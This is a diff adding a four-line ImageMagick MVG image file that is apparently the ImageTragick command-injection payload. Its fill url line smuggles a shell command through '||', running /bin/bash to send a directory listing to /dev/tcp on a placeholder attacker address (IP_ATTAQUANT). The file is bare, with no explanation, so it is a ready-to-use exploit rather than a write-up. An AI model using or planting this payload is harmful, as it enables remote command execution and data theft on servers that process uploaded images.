@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://IP_ATTAQUANT"||/bin/bash -c "ls > /dev/tcp/IP_ATTAQUANT/80)'
+pop graphic-context
